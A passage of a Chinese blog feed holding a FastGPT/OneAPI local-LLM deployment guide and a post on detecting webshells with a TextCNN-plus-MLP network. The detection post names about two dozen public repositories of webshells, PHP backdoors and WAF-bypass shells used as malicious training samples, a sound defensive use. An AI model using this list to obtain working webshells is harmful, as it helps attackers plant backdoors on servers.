的话，OPENAI_BASE_URL&#x3D;OneAPI访问地址&#x2F;v1；CHAT_API_KEY&#x3D;令牌</p></li><li><p>修改 config.json 中的本地问答大模型、Embedding 模型以及 ReRank 模型的相关信息</p></li><li><p>在 docker-compose.yml 同级目录下执行</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 进入项目目录</span></span><br><span class="line"><span class="built_in">cd</span> 项目目录</span><br><span class="line"><span class="comment"># 创建 mongo 密钥</span></span><br><span class="line">openssl rand -<span class="built_in">base64</span> 756 &gt; ./mongodb.key</span><br><span class="line"><span class="comment"># 600不行可以用chmod 999</span></span><br><span class="line"><span class="built_in">chmod</span> 600 ./mongodb.key</span><br><span class="line"><span class="built_in">chown</span> 999:root ./mongodb.key</span><br><span class="line"><span class="comment"># 启动容器</span></span><br><span class="line">docker compose pull</span><br><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure></li><li><p>初始化 Mongo 副本集(4.6.8以前可忽略)</p><ul><li>Mongo 数据库需要修改副本集的host，从原来的mongo:27017修改为ip:27017。</li></ul>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看 mongo 容器是否正常运行</span></span><br><span class="line">docker ps</span><br><span class="line"><span class="comment"># 进入容器</span></span><br><span class="line">docker <span class="built_in">exec</span> -it mongo bash</span><br><span class="line"></span><br><span class="line"><span class="comment"># 连接数据库</span></span><br><span class="line">mongo -u myname -p mypassword --authenticationDatabase admin</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化副本集。如果需要外网访问，mongo:27017 可以改成 ip:27017。但是需要同时修改 FastGPT 连接的参数（MONGODB_URI=mongodb://myname:mypassword@mongo:27017/fastgpt?authSource=admin =&gt; MONGODB_URI=mongodb://myname:mypassword@ip:27017/fastgpt?authSource=admin）</span></span><br><span class="line">rs.initiate(&#123;</span><br><span class="line">  _id: <span class="string">&quot;rs0&quot;</span>,</span><br><span class="line">  members: [</span><br><span class="line">    &#123; _id: 0, host: <span class="string">&quot;mongo:27017&quot;</span> &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment"># 检查状态。如果提示 rs0 状态，则代表运行成功</span></span><br><span class="line">rs.status()</span><br></pre></td></tr></table></figure></li></ul><h2 id="访问-FastGPT"><a href="#访问-FastGPT" class="headerlink" title="访问 FastGPT"></a>访问 FastGPT</h2><ul><li>目前可以通过<code>http://&lt;ip&gt;:8080</code>直接访问(注意防火墙)。登录用户名为<code>root</code>，密码为<code>docker-compose.yml</code>环境变量里设置的<code>DEFAULT_ROOT_PSW</code></li><li>如果需要域名访问，请自行安装并配置 Nginx</li></ul><h1 id="分布式部署"><a href="#分布式部署" class="headerlink" title="分布式部署"></a>分布式部署</h1><h2 id="部署对话大模型"><a href="#部署对话大模型" class="headerlink" title="部署对话大模型"></a>部署对话大模型</h2><ul><li>选择以下其中一种大模型部署即可</li></ul><h3 id="Baichuan2-13B-Chat"><a href="#Baichuan2-13B-Chat" class="headerlink" title="Baichuan2-13B-Chat"></a>Baichuan2-13B-Chat</h3><ul><li><p>推荐配置</p><table><thead><tr><th>类型</th><th>内存</th><th>显存</th><th>硬盘空间</th><th>启动命令</th></tr></thead><tbody><tr><td>fp16</td><td>≥ 32GB</td><td>≥ 28GB</td><td>≥ 50GB</td><td>python openai_api.py</td></tr><tr><td>int8</td><td>≥ 32GB</td><td>≥ 17GB</td><td>≥ 50GB</td><td>python openai_api.py（设置环境变量 QUANTIZE_BIT&#x3D;8）</td></tr><tr><td>int4</td><td>≥ 32GB</td><td>≥ 9GB</td><td>≥ 50GB</td><td>python openai_api.py（设置环境变量 QUANTIZE_BIT&#x3D;4）</td></tr></tbody></table></li><li><p>部署环境要求</p><ul><li>Python 3.10</li><li>NVIDIA 驱动 + CUDA 等套件</li></ul></li><li><p>源码部署</p><ul><li><p>将 Baichuan2-13B-Chat 模型文件下载到本地</p><p>  <a href="https://modelscope.cn/models/baichuan-inc/Baichuan2-13B-Chat">百川2-13B-对话模型</a></p></li><li><p>下载相关文件</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -O https://raw.githubusercontent.com/Coldwave96/FastGPT-Deploy-Utilities/main/LLM-Chat/Baichuan2-13B-Chat/openai_api.py</span><br><span class="line">curl -O https://raw.githubusercontent.com/Coldwave96/FastGPT-Deploy-Utilities/main/LLM-Chat/Baichuan2-13B-Chat/requirements.txt</span><br></pre></td></tr></table></figure></li><li><p>安装依赖</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure></li><li><p>设置环境变量<code>SK_KEY</code>，这是大模型调用接口认证 token，防止接口盗用</p></li><li><p>修改<code>openai_api.py</code>文件中模型名称<code>baichuan-inc/Baichuan2-13B-Chat</code>为本地模型所在文件夹</p></li><li><p>运行启动命令<code>python openai_api.py</code></p></li></ul></li></ul><h3 id="Baichuan2-7B-Chat"><a href="#Baichuan2-7B-Chat" class="headerlink" title="Baichuan2-7B-Chat"></a>Baichuan2-7B-Chat</h3><ul><li><p>推荐配置</p><table><thead><tr><th>类型</th><th>内存</th><th>显存</th><th>硬盘空间</th><th>启动命令</th></tr></thead><tbody><tr><td>fp16</td><td>≥ 16GB</td><td>≥ 16GB</td><td>≥ 25GB</td><td>python openai_api.py</td></tr><tr><td>int8</td><td>≥ 16GB</td><td>≥ 9GB</td><td>≥ 25GB</td><td>python openai_api.py（设置环境变量 QUANTIZE_BIT&#x3D;8）</td></tr><tr><td>int4</td><td>≥ 16GB</td><td>≥ 6GB</td><td>≥ 25GB</td><td>python openai_api.py（设置环境变量 QUANTIZE_BIT&#x3D;4）</td></tr></tbody></table></li><li><p>部署环境要求</p><ul><li>Python 3.10</li><li>NVIDIA 驱动 + CUDA 等套件</li></ul></li><li><p>源码部署</p><ul><li><p>将 Baichuan2-7B-Chat 模型文件下载到本地</p><p>  <a href="https://modelscope.cn/models/baichuan-inc/Baichuan2-7B-Chat">百川2-7B-对话模型</a></p></li><li><p>下载相关文件</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -O https://raw.githubusercontent.com/Coldwave96/FastGPT-Deploy-Utilities/main/LLM-Chat/Baichuan2-7B-Chat/openai_api.py</span><br><span class="line">curl -O https://raw.githubusercontent.com/Coldwave96/FastGPT-Deploy-Utilities/main/LLM-Chat/Baichuan2-7B-Chat/requirements.txt</span><br></pre></td></tr></table></figure></li><li><p>安装依赖</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure></li><li><p>设置环境变量<code>SK_KEY</code>，这是大模型调用接口认证 token，防止接口盗用</p></li><li><p>修改<code>openai_api.py</code>文件中模型名称<code>baichuan-inc/Baichuan2-7B-Chat</code>为本地模型所在文件夹</p></li><li><p>运行启动命令<code>python openai_api.py</code></p></li></ul></li></ul><h3 id="ChatGLM2-6B"><a href="#ChatGLM2-6B" class="headerlink" title="ChatGLM2-6B"></a>ChatGLM2-6B</h3><ul><li><p>推荐配置</p><table><thead><tr><th>类型</th><th>内存</th><th>显存</th><th>硬盘空间</th><th>启动命令</th></tr></thead><tbody><tr><td>fp16</td><td>≥ 16GB</td><td>≥ 16GB</td><td>≥ 25GB</td><td>python openai_api.py</td></tr><tr><td>int8</td><td>≥ 16GB</td><td>≥ 9GB</td><td>≥ 25GB</td><td>python openai_api.py（设置环境变量 QUANTIZE_BIT&#x3D;8）</td></tr><tr><td>int4</td><td>≥ 16GB</td><td>≥ 6GB</td><td>≥ 25GB</td><td>python openai_api.py（设置环境变量 QUANTIZE_BIT&#x3D;4）</td></tr></tbody></table></li><li><p>部署环境要求</p><ul><li>Python 3.10</li><li>NVIDIA 驱动 + CUDA 等套件</li></ul></li><li><p>源码部署</p><ul><li><p>将 ChatGLM2-6B 模型文件下载到本地</p><p>  <a href="https://modelscope.cn/models/ZhipuAI/chatglm2-6b/">chatglm2-6b</a></p></li><li><p>下载相关文件</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -O https://raw.githubusercontent.com/Coldwave96/FastGPT-Deploy-Utilities/main/LLM-Chat/ChatGLM2-6B/openai_api.py</span><br><span class="line">curl -O https://raw.githubusercontent.com/Coldwave96/FastGPT-Deploy-Utilities/main/LLM-Chat/ChatGLM2-6B/requirements.txt</span><br></pre></td></tr></table></figure></li><li><p>安装依赖</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure></li><li><p>设置环境变量<code>SK_KEY</code>，这是大模型调用接口认证 token，防止接口盗用</p></li><li><p>修改<code>openai_api.py</code>文件中模型名称<code>THUDM/chatglm2-6b</code>为本地模型所在文件夹</p></li><li><p>运行启动命令<code>python openai_api.py</code></p></li></ul></li></ul><h2 id="部署-Embedding-模型"><a href="#部署-Embedding-模型" class="headerlink" title="部署 Embedding 模型"></a>部署 Embedding 模型</h2><h3 id="M3E-large"><a href="#M3E-large" class="headerlink" title="M3E-large"></a>M3E-large</h3><ul><li><p>推荐配置</p><table><thead><tr><th>内存</th><th>显存</th><th>硬盘空间</th><th>启动命令</th></tr></thead><tbody><tr><td>≥ 8GB</td><td>≥ 6GB</td><td>≥ 10GB</td><td>python openai_api.py</td></tr></tbody></table></li><li><p>部署环境要求</p><ul><li>Python 3.8</li><li>NVIDIA 驱动 + CUDA 等套件</li></ul></li><li><p>源码部署</p><ul><li><p>将 M3E-large 模型文件下载到本地</p><p>  <a href="https://modelscope.cn/models/Jerry0/M3E-large/">M3E-large</a></p></li><li><p>下载相关文件</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -O https://raw.githubusercontent.com/Coldwave96/FastGPT-Deploy-Utilities/main/LLM-Embedding/M3E-large/openai_api.py</span><br><span class="line">curl -O https://raw.githubusercontent.com/Coldwave96/FastGPT-Deploy-Utilities/main/LLM-Embedding/M3E-large/requirements.txt</span><br></pre></td></tr></table></figure></li><li><p>安装依赖</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure></li><li><p>设置环境变量<code>SK_KEY</code>，这是大模型调用接口认证 token，防止接口盗用</p></li><li><p>修改<code>openai_api.py</code>文件中模型名称<code>moka-ai/m3e-large</code>为本地模型所在文件夹</p></li><li><p>运行启动命令<code>python openai_api.py</code></p></li></ul></li></ul><h2 id="部署-ReRank-重排模型"><a href="#部署-ReRank-重排模型" class="headerlink" title="部署 ReRank 重排模型"></a>部署 ReRank 重排模型</h2><h3 id="BGE-ReRanker-Base"><a href="#BGE-ReRanker-Base" class="headerlink" title="BGE-ReRanker-Base"></a>BGE-ReRanker-Base</h3><ul><li><p>推荐配置</p><table><thead><tr><th>类型</th><th>内存</th><th>显存</th><th>硬盘空间</th><th>启动命令</th></tr></thead><tbody><tr><td>base</td><td>≥ 4GB</td><td>≥ 3GB</td><td>≥ 8GB</td><td>python api.py</td></tr></tbody></table></li><li><p>部署环境要求</p><ul><li>Python 3.10</li><li>NVIDIA 驱动 + CUDA 等套件</li></ul></li><li><p>源码部署</p><ul><li><p>将 BGE-ReRanker-base 模型下载到本地</p><p>  <a href="https://huggingface.co/BAAI/bge-reranker-base">BAAI&#x2F;bge-reranker-base · Hugging Face</a></p></li><li><p>下载相关文件（与存放模型的文件夹在同一级）</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -O https://raw.githubusercontent.com/Coldwave96/FastGPT-Deploy-Utilities/main/LLM-ReRanker/BGE-ReRanker-base/api.py</span><br><span class="line">curl -O https://raw.githubusercontent.com/Coldwave96/FastGPT-Deploy-Utilities/main/LLM-ReRanker/BGE-ReRanker-base/requirements.txt</span><br></pre></td></tr></table></figure></li><li><p>安装依赖</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure></li><li><p>添加环境变量<code>export ACCESS_TOKEN=XXXXXX</code>配置 token，这里的 token 只是加一层验证，防止接口被人盗用，默认值为<code>ACCESS_TOKEN</code></p></li><li><p>修改<code>api.py</code>文件中<code>bge-reranker-large</code>为存储本地模型文件夹名称</p></li><li><p>运行启动命令<code>python api.py</code></p></li></ul></li></ul><h2 id="部署-OneAPI"><a href="#部署-OneAPI" class="headerlink" title="部署 OneAPI"></a>部署 OneAPI</h2><h3 id="Docker-部署"><a href="#Docker-部署" class="headerlink" title="Docker 部署"></a>Docker 部署</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用 SQLite 的部署命令：</span></span><br><span class="line">docker run --name one-api -d --restart always -p <span class="number">3000</span>:<span class="number">3000</span> -e TZ=Asia/Shanghai -v /home/ubuntu/data/one-api:/data justsong/one-api</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 MySQL 的部署命令，在上面的基础上添加 `-e SQL_DSN=&quot;root:123456@tcp(localhost:3306)/oneapi&quot;`，请自行修改数据库连接参数，不清楚如何修改请参见下面环境变量一节。</span></span><br><span class="line"><span class="comment"># 例如：</span></span><br><span class="line">docker run --name one-api -d --restart always -p <span class="number">3000</span>:<span class="number">3000</span> -e SQL_DSN=<span class="string">&quot;root:123456@tcp(localhost:3306)/oneapi&quot;</span> -e TZ=Asia/Shanghai -v /home/ubuntu/data/one-api:/data justsong/one-api</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>其中，-p 3000:3000 中的第一个 3000 是宿主机的端口，可以根据需要进行修改</li><li>数据和日志将会保存在宿主机的<code>/home/ubuntu/data/one-api</code>目录，请确保该目录存在且具有写入权限，或者更改为合适的目录</li><li>如果启动失败，请添加<code>-privileged=true</code></li><li>访问<code>http://&lt;ip&gt;:3000/</code>并登录。初始账号用户名为<code>root</code>，密码为<code>123456</code></li></ul><h3 id="创建令牌"><a href="#创建令牌" class="headerlink" title="创建令牌"></a>创建令牌</h3><ul><li>可设置永不过期，无限额度</li></ul><h3 id="接入本地问答大模型"><a href="#接入本地问答大模型" class="headerlink" title="接入本地问答大模型"></a>接入本地问答大模型</h3><ul><li>类型：OpenAI</li><li>名称：随便写</li><li>模型：自定义模型名称</li><li>代理：本地大模型开放的 OpenAI 格式的 API 接口地址</li></ul><h3 id="接入本地-Embedding-模型"><a href="#接入本地-Embedding-模型" class="headerlink" title="接入本地 Embedding 模型"></a>接入本地 Embedding 模型</h3><ul><li>类型：自定义渠道</li><li>Base URL：Embedding 模型开放的 OpenAI 格式的 API 接口地址</li><li>名称：随便写</li><li>模型：自定义模型名称</li><li>密钥：开放接口定义的密钥</li></ul><h2 id="部署-FastGPT-1"><a href="#部署-FastGPT-1" class="headerlink" title="部署 FastGPT"></a>部署 FastGPT</h2><h3 id="Docker-Compose-快速部署"><a href="#Docker-Compose-快速部署" class="headerlink" title="Docker Compose 快速部署"></a>Docker Compose 快速部署</h3><ul><li><p>依次执行下面命令，创建 FastGPT 文件并拉取docker-compose.yml和config.json，执行完后目录下会有 2 个文件</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> fastgpt</span><br><span class="line"><span class="built_in">cd</span> fastgpt</span><br><span class="line">curl -O https://raw.githubusercontent.com/Coldwave96/FastGPT-Deploy-Utilities/main/FastGPT/docker-compose.yml</span><br><span class="line">curl -O https://raw.githubusercontent.com/Coldwave96/FastGPT-Deploy-Utilities/main/FastGPT/config.json</span><br></pre></td></tr></table></figure><ul><li>注意: docker-compose.yml 配置文件中 Mongo 为 5.x，部分服务器不支持，需手动更改其镜像版本为 4.4.24</li></ul></li><li><p>修改 docker-compose.yml 中的 OPENAI_BASE_URL（API 接口的地址，需要加&#x2F;v1）和CHAT_API_KEY（API 接口的凭证)</p></li><li><p>使用 OneAPI 的话，OPENAI_BASE_URL&#x3D;OneAPI访问地址&#x2F;v1；CHAT_API_KEY&#x3D;令牌</p></li><li><p>修改 config.json 中的本地问答大模型、Embedding 模型以及 ReRank 模型的相关信息</p></li><li><p>在 docker-compose.yml 同级目录下执行</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 进入项目目录</span></span><br><span class="line"><span class="built_in">cd</span> 项目目录</span><br><span class="line"><span class="comment"># 创建 mongo 密钥</span></span><br><span class="line">openssl rand -<span class="built_in">base64</span> 756 &gt; ./mongodb.key</span><br><span class="line"><span class="comment"># 600不行可以用chmod 999</span></span><br><span class="line"><span class="built_in">chmod</span> 600 ./mongodb.key</span><br><span class="line"><span class="built_in">chown</span> 999:root ./mongodb.key</span><br><span class="line"><span class="comment"># 启动容器</span></span><br><span class="line">docker compose pull</span><br><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure></li><li><p>初始化 Mongo 副本集(4.6.8以前可忽略)</p><ul><li>Mongo 数据库需要修改副本集的host，从原来的mongo:27017修改为ip:27017。</li></ul>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看 mongo 容器是否正常运行</span></span><br><span class="line">docker ps</span><br><span class="line"><span class="comment"># 进入容器</span></span><br><span class="line">docker <span class="built_in">exec</span> -it mongo bash</span><br><span class="line"></span><br><span class="line"><span class="comment"># 连接数据库</span></span><br><span class="line">mongo -u myname -p mypassword --authenticationDatabase admin</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化副本集。如果需要外网访问，mongo:27017 可以改成 ip:27017。但是需要同时修改 FastGPT 连接的参数（MONGODB_URI=mongodb://myname:mypassword@mongo:27017/fastgpt?authSource=admin =&gt; MONGODB_URI=mongodb://myname:mypassword@ip:27017/fastgpt?authSource=admin）</span></span><br><span class="line">rs.initiate(&#123;</span><br><span class="line">  _id: <span class="string">&quot;rs0&quot;</span>,</span><br><span class="line">  members: [</span><br><span class="line">    &#123; _id: 0, host: <span class="string">&quot;mongo:27017&quot;</span> &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment"># 检查状态。如果提示 rs0 状态，则代表运行成功</span></span><br><span class="line">rs.status()</span><br></pre></td></tr></table></figure></li></ul><h3 id="访问-FastGPT-1"><a href="#访问-FastGPT-1" class="headerlink" title="访问 FastGPT"></a>访问 FastGPT</h3><ul><li>目前可以通过 ip:8080 直接访问(注意防火墙)。登录用户名为 root，密码为 docker-compose.yml 环境变量里设置的 DEFAULT_ROOT_PSW</li><li>如果需要域名访问，请自行安装并配置 Nginx</li></ul>]]></content>
      
      
      <categories>
          
          <category> AI </category>
          
          <category> Sites </category>
          
      </categories>
      
      
        <tags>
            
            <tag> FastGPT </tag>
            
            <tag> Docker Compose </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基于深度神经网络的Webshell静态检测</title>
      <link href="/2024/02/22/WebshellCNN/"/>
      <url>/2024/02/22/WebshellCNN/</url>
      
        <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>Webshell作为黑客惯用的入侵工具，是以php、asp、jsp、perl、cgi、py等网页文件形式存在的一种命令执行环境。黑客在入侵一个网站服务器后，通常会将webshell后门文件与网站服务器WEB目录下正常网页文件混在一起，通过Web访问webshell后门进行文件上传下载、访问数据库、系统命令调用等各种高危操作，达到非法控制网站服务器的目的，具备威胁程度高，隐蔽性极强等特点。</p><p>本文尝试通过一个 TextCNN + 二分类网络合成的综合深度神经网络实现对于 Webshell 的静态检测。TextCNN 用于处理向量化后的词数组，二分类网络用于处理手动提取的数字化特征（文件的大小以及熵值等等）。</p><span id="more"></span><p>2019年曾经做过一个简单的 Webshell 检测系统。源代码通过 N-Gram 分割的方式，对分割后的字符结合 TF-IDF 技术建立词袋，然后通过简单的机器学习算法如 NB、SVM 等进行二分类。现在的合成网络在利用 TextCNN 深度神经网络自动提取特征的基础上，结合手动设计提取的数字化特征，如文件大小，文件熵等信息，实现综合分类网络，对于一句话木马以及混淆木马有着更好的检测能力。</p><h2 id="数据集"><a href="#数据集" class="headerlink" title="数据集"></a>数据集</h2><p>原始数据集采集自 <a href="https://github.com/">Github</a>，下面是详细的仓库列表.</p><h3 id="黑样本"><a href="#黑样本" class="headerlink" title="黑样本"></a>黑样本</h3><ol><li><a href="https://github.com/tennc/webshell">tennc&#x2F;webshell</a></li><li><a href="https://github.com/JohnTroony/php-webshells">JohnTroony&#x2F;php-webshells</a></li><li><a href="https://github.com/xl7dev/webshell">xl7dev&#x2F;webshell</a></li><li><a href="https://github.com/tutorial0/webshell">tutorial0&#x2F;webshell</a></li><li><a href="https://github.com/bartblaze/PHP-backdoors">bartblaze&#x2F;PHP-backdoors</a></li><li><a href="https://github.com/BlackArch/webshells">BlackArch&#x2F;webshells</a></li><li><a href="https://github.com/nikicat/web-malware-collection">nikicat&#x2F;web-malware-collection</a></li><li><a href="https://github.com/fuzzdb-project/fuzzdb">fuzzdb-project&#x2F;fuzzdb</a></li><li><a href="https://github.com/lcatro/PHP-webshell-Bypass-WAF">lcatro&#x2F;PHP-webshell-Bypass-WAF</a></li><li><a href="https://github.com/linuxsec/indoxploit-shell">linuxsec&#x2F;indoxploit-shell</a></li><li><a href="https://github.com/b374k/b374k">b374k&#x2F;b374k</a></li><li><a href="https://github.com/LuciferoO/webshell-collector">LuciferoO&#x2F;webshell-collector</a></li><li><a href="https://github.com/tanjiti/webshell-Sample">tanjiti&#x2F;webshell-Sample</a></li><li><a href="https://github.com/JoyChou93/webshell">JoyChou93&#x2F;webshell</a></li><li><a href="https://github.com/webshellpub/awsome-webshell">webshellpub&#x2F;awsome-webshell</a></li><li><a href="https://github.com/xypiie/webshell">xypiie&#x2F;webshell</a></li><li><a href="https://github.com/leett1/Programe/">leett1&#x2F;Programe&#x2F;</a></li><li><a href="https://github.com/lhlsec/webshell">lhlsec&#x2F;webshell</a></li><li><a href="https://github.com/feihong-cs/JspMaster-Deprecated">feihong-cs&#x2F;JspMaster-Deprecated</a></li><li><a href="https://github.com/threedr3am/JSP-Webshells">threedr3am&#x2F;JSP-Webshells</a></li><li><a href="https://github.com/oneoneplus/webshell">oneoneplus&#x2F;webshell</a></li><li><a href="https://github.com/fr4nk404/Webshell-Collections">fr4nk404&#x2F;Webshell-Collections</a></li><li><a href="https://github.com/mattiasgeniar/php-exploit-scripts">mattiasgeniar&#x2F;php-exploit-scripts</a></li></ol><h3 id="白样本："><a href="#白样本：" class="headerlink" title="白样本："></a>白样本：</h3><ol><li><a href="https://github.com/WordPress/WordPress">WordPress&#x2F;WordPress</a></li><li><a href="https://github.com/yiisoft/yii2">yiisoft&#x2F;yii2</a> </li><li><a href="https://github.com/johnshen/PHPcms">johnshen&#x2F;PHPcms</a></li><li><a href="https://www.kashipara.com/">https://www.kashipara.com</a></li><li><a href="https://github.com/joomla/joomla-cms">joomla&#x2F;joomla-cms</a></li><li><a href="https://github.com/laravel/laravel">laravel&#x2F;laravel</a></li><li><a href="https://github.com/learnstartup/4tweb">learnstartup&#x2F;4tweb</a></li><li><a href="https://github.com/phpmyadmin/phpmyadmin">phpmyadmin&#x2F;phpmyadmin</a></li><li><a href="https://github.com/rainrocka/xinhu">rainrocka&#x2F;xinhu</a></li><li><a href="https://github.com/octobercms/october">octobercms&#x2F;october</a></li><li><a href="https://github.com/alkacon/opencms-core">alkacon&#x2F;opencms-core</a></li><li><a href="https://github.com/craftcms/cms">craftcms&#x2F;cms</a></li><li><a href="https://github.com/croogo/croogo">croogo&#x2F;croogo</a></li><li><a href="https://github.com/doorgets/CMS">doorgets&#x2F;CMS</a></li><li><a href="https://github.com/smarty-php/smarty">smarty-php&#x2F;smarty</a></li><li><a href="https://github.com/source-trace/phpcms">source-trace&#x2F;phpcms</a></li><li><a href="https://github.com/symfony/symfony">symfony&#x2F;symfony</a></li><li><a href="https://github.com/typecho/typecho">typecho&#x2F;typecho</a></li><li><a href="https://github.com/leett1/Programe/">leett1&#x2F;Programe&#x2F;</a></li><li><a href="https://github.com/rpeterclark/aspunit">rpeterclark&#x2F;aspunit</a></li><li><a href="https://github.com/dluxem/LiberumASP">dluxem&#x2F;LiberumASP</a></li><li><a href="https://github.com/aspLite/aspLite">aspLite&#x2F;aspLite</a></li><li><a href="https://github.com/coldstone/easyasp">coldstone&#x2F;easyasp</a></li><li><a href="https://github.com/amasad/sane">amasad&#x2F;sane</a></li><li><a href="https://github.com/sextondb/ClassicASPUnit">sextondb&#x2F;ClassicASPUnit</a></li><li><a href="https://github.com/ASP-Ajaxed/asp-ajaxed">ASP-Ajaxed&#x2F;asp-ajaxed</a></li><li><a href="https://www.codewithc.com/">https://www.codewithc.com</a></li></ol><h3 id="综合数据集"><a href="#综合数据集" class="headerlink" title="综合数据集"></a>综合数据集</h3><p>处理后的综合数据集存放在 <a href="https://huggingface.co/datasets/c01dsnap/Webshell">Hugging Face</a>.</p><h2 id="模型结构"><a href="#模型结构" class="headerlink" title="模型结构"></a>模型结构</h2><p>程序会从指定的文件夹中读取指定类型的文件，计算这些文件的大小和熵值，以及通过 <a href="https://www.nltk.org/">nltk</a> 进行词分割。分割好的词传入 <code>tf.keras.layers.TextVectorization</code> 建立词库并完成向量化，然后传入 TextCNN 网络。文件的大小和熵值通过归一化处理后，传入一个二分类网络。</p><p>其中，TextCNN 网络的结构为输入层，嵌入层，3 个卷积核大小分别为 3、4、5 的卷积层，然后将 3 个卷积层的池化结果拼接后传入全连接层，插入 Dropout 层防止过拟合，最后传入输出层。二分类网络就是简单的 MLP 网络。最后将两个网络连接，获取最终的判断结果。</p><p>网络结构如下：<br><img src="/img/WebshellCNN/WebshellCNN1.png"></p><h2 id="结果评估"><a href="#结果评估" class="headerlink" title="结果评估"></a>结果评估</h2><p>训练过程中的表现如下：<br><img src="/img/WebshellCNN/WebshellCNN2.png"></p><p>模型评估结果如下：<br><img src="/img/WebshellCNN/WebshellCNN3.png"></p>]]></content>
      
      
      <categories>
          
          <category> Program </category>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> NLP </tag>
            
            <tag> Webshell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>智能实体在网络空间自动化防御系统中的应用</title>
      <link href="/2023/11/13/IAforID/"/>
      <url>/2023/11/13/IAforID/</url>
      
